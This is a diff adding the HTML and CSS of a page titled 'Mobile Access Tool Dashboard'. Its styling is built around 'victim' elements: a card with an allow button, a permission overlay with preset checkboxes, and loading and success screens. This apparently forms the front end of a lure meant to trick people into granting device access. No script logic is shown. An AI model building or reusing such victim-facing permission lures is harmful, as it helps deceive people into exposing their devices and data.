@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Mobile Access Tool Dashboard</title>
+    <meta name="theme-color" content="#0a0a0f">
+    <link rel="stylesheet" href="assets/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <style>
+        /* Dashboard specific styles */
+        .victim-container {
+            max-width: 480px;
+            margin: 0 auto;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background: #0a0a0f;
+        }
+        .victim-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px 20px;
+            background: #111;
+            border-bottom: 1px solid #222;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .victim-brand {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 20px;
+            font-weight: 700;
+            color: #fff;
+        }
+        .victim-brand i { color: #ff0050; font-size: 24px; }
+        .victim-time { font-size: 13px; color: #888; }
+        .victim-content {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .victim-card {
+            background: linear-gradient(145deg, #1a1a2e, #16213e);
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            border-radius: 24px;
+            padding: 32px 24px;
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+        }
+        .victim-card-glow {
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at 50% 50%, rgba(0,255,136,0.03), transparent 60%);
+            animation: rotate-glow 10s linear infinite;
+            pointer-events: none;
+        }
+        @keyframes rotate-glow {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .victim-card-icon {
+            position: relative;
+            font-size: 56px;
+            color: #00ff88;
+            margin-bottom: 16px;
+            display: inline-block;
+        }
+        .icon-pulse {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80px;
+            height: 80px;
+            border: 2px solid rgba(0,255,136,0.2);
+            border-radius: 50%;
+            animation: pulse-ring 2s infinite;
+        }
+        @keyframes pulse-ring {
+            0% { transform: translate(-50%,-50%) scale(0.8); opacity: 1; }
+            100% { transform: translate(-50%,-50%) scale(1.5); opacity: 0; }
+        }
+        .victim-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 10px;
+            position: relative;
+            z-index: 1;
+        }
+        .victim-desc {
+            font-size: 14px;
+            color: #aaa;
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 1;
+            line-height: 1.5;
+        }
+        .victim-features {
+            text-align: left;
+            margin-bottom: 24px;
+            padding: 0 8px;
+            position: relative;
+            z-index: 1;
+        }
+        .vf-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 13px;
+            color: #ccc;
+            padding: 6px 0;
+        }
+        .victim-allow-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #00ff88, #00cc44);
+            border: none;
+            border-radius: 14px;
+            color: #000;
+            font-family: 'Inter', sans-serif;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.3s;
+            position: relative;
+            z-index: 1;
+        }
+        .victim-allow-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(0,255,136,0.3);
+        }
+        .victim-footer-text {
+            font-size: 12px;
+            color: #666;
+            margin-top: 16px;
+            position: relative;
+            z-index: 1;
+        }
+        .victim-footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: #555;
+        }
+        .victim-footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-top: 6px;
+        }
+        .victim-footer-links a {
+            color: #777;
+            text-decoration: none;
+            font-size: 11px;
+        }
+        
+        /* Permission overlay */
+        .permission-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.85);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            backdrop-filter: blur(10px);
+            animation: fadeIn 0.3s ease;
+        }
+        @keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
+        .perm-card {
+            background: #1a1a2e;
+            border: 1px solid #333;
+            border-radius: 24px;
+            padding: 28px 24px;
+            width: 90%;
+            max-width: 360px;
+            text-align: center;
+        }
+        .perm-icon {
+            font-size: 32px;
+            margin-bottom: 12px;
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            color: #00ccff;
+        }
+        .perm-card h3 {
+            font-size: 20px;
+            color: #fff;
+            margin-bottom: 8px;
+        }
+        .perm-card > p {
+            font-size: 13px;
+            color: #999;
+            margin-bottom: 16px;
+        }
+        .perm-list {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+        .perm-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 12px;
+            background: rgba(255,255,255,0.03);
+            border-radius: 10px;
+            margin-bottom: 6px;
+            font-size: 14px;
+            color: #ddd;
+            cursor: not-allowed;
+        }
+        .perm-item input[type="checkbox"] {
+            accent-color: #00ff88;
+            width: 18px;
+            height: 18px;
+        }
+        .perm-allow-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #00ff88, #00cc44);
+            border: none;
+            border-radius: 12px;
+            color: #000;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-bottom: 10px;
+            font-family: 'Inter', sans-serif;
+        }
+        .perm-deny-btn {
+            width: 100%;
+            padding: 14px;
+            background: transparent;
+            border: 1px solid #444;
+            border-radius: 12px;
+            color: #888;
+            font-size: 14px;
+            cursor: pointer;
+            font-family: 'Inter', sans-serif;
+        }
+        
+        /* Loading */
+        .victim-loading {
+            position: relative;
+            z-index: 1;
+            padding: 20px 0;
+        }
+        .spinner {
+            font-size: 36px;
+            color: #00ff88;
+            margin-bottom: 12px;
+        }
+        .victim-loading p {
+            font-size: 14px;
+            color: #aaa;
+            margin-bottom: 16px;
+        }
+        .loading-bar {
+            width: 80%;
+            height: 4px;
+            background: #222;
+            border-radius: 4px;
+            margin: 0 auto;
+            overflow: hidden;
+        }
+        .loading-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00ff88, #00ccff);
+            border-radius: 4px;
+            animation: loading-progress 2.5s ease-in-out infinite;
+        }
+        @keyframes loading-progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        
+        /* Success */
+        .victim-success {
+            position: relative;
+            z-index: 1;
+            padding: 20px 0;
+        }
+        .success-icon {
+            font-size: 64px;
+            color: #00ff88;
+            margin-bottom: 12px;
+            animation: success-pop 0.5s ease-out;
+        }
+        @keyframes success-pop {
+            0% { transform: scale(0); }
+            50% { transform: scale(1.2); }
+            100% { transform: scale(1); }
+        }
+        .victim-success h3 {
+            font-size: 22px;
+            color: #fff;
+            margin-bottom: 8px;
+        }
+        .victim-success p {
+            font-size: 14px;
+            color: #aaa;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="mainContainer">
+        <div style="text-align:center;padding:60px 20px;">
+            <i class="fas fa-spinner fa-spin" style="font-size:36px;color:var(--accent-1);"></i>
+            <p style="margin-top:16px;color:var(--text-muted);">Loading dashboard...</p>
+        </div>
+    </div>
+    <script src="assets/script.js"></script>
+</body>
+</html>
